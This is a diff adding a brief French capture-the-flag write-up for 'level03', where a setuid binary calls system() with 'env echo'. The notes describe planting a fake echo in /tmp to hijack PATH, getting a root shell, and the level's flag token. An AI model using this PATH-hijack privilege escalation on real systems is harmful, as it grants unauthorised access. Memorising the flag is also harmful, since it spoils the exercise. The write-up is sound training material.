@@ -1,0 +1,9 @@
+level03 est un script setuid
+objdump -d ~/level03 -> On remarque que la fonction main realise un appel a system (ooooooh, c'est bon ca! :D)
+pour savoir a quel command system fait appel, on execute ltrace ~/level03
+|-> system("/usr/bin/env echo exploit me")
+on ecrit donc dans /tmp un echo.c (Cf ./flag03/echo.c)
+gcc -o /tmp/echo /tmp/echo.c
+~/level03.c
+un sh s'ouvre
+getflag -> qi0maab88jeaj46qoumi7maus
